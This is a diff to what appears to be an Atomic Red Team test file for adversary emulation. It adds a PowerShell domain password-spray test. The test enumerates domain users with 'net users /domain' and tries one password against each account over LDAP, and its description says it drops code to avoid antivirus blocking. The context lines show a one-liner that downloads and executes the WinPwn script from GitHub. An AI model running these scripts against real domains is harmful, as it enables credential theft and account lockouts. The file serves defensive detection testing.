@@ -168,3 +168,58 @@ atomic_tests:
       iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
       domainpassspray -consoleoutput -noninteractive -emptypasswords
     name: powershell
+- name: Password Spray Invoke-DomainPasswordSpray Light
+  description: |
+    Perform a domain password spray using the same core method of the [DomainPasswordSpray tool](https://github.com/dafthack/DomainPasswordSpray) 
+    but without all the extra code that makes the script get blocked by many AVs. 
+    This atomic test will attempt a single password against all users in a password list at $env:Temp\usersdpsLight.txt. You can create this file manually
+    or with the automated prereq_command. The prereq_command will limit the user list to 200 users by default to help you avoid massive account lockout.
+  supported_platforms:
+    - windows
+  input_arguments:
+    user_limit:
+      description: The max number of users to put in the list when running the prereq_command
+      type: Integer
+      default: 200
+    password:
+      description: The password to try for each user in users.txt
+      type: String
+      default: Spring2020
+  dependencies:
+  - description: |
+      Username file must exist at $env:Temp\usersdpsLight.txt
+    prereq_command: |
+      if (Test-Path  $env:Temp\usersdpsLight.txt) {exit 0} else {exit 1}
+    get_prereq_command: |
+      Write-Host -NoNewLine "Reading Users." # this code modifed from https://github.com/ZoomerHulkHogan/Powershell-Domain-User-Enumeration
+      $netOutput = net users /domain
+      $netOutput = [System.Collections.ArrayList]($netOutput[6..($netOutput.length-3)])
+      $userLimit = #{user_limit}; $usercount = 0
+      foreach ($line in $netOutput) {
+        if($usercount -ge $userLimit){break}
+        $line = $line.trim()
+        $line = $line -split '\s\s+'
+        foreach ($user in $line){
+          if($usercount -ge $userLimit){break}
+          Add-Content $env:Temp\usersdpsLight.txt $user
+          $usercount = $usercount + 1
+          }  
+      }
+      Write-Host "Usernames saved to $env:Temp\usersdpsLight.txt"
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      function Invoke-dpsLight ($Password, $userlist) {
+      $users = Get-Content $userlist
+      $Domain = "LDAP://" + ([ADSI]"").distinguishedName
+      foreach ($User in $users) {
+        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password)
+        if ($Domain_check.name -ne $null) {
+          Write-Host -ForegroundColor Green "Password found for User:$User Password:$Password"
+        }
+        else { Write-Host ". " -NoNewline}
+      }
+      Write-Host -ForegroundColor green "Finished"
+      }
+      Invoke-dpsLight "#{password}" $env:Temp\usersdpsLight.txt
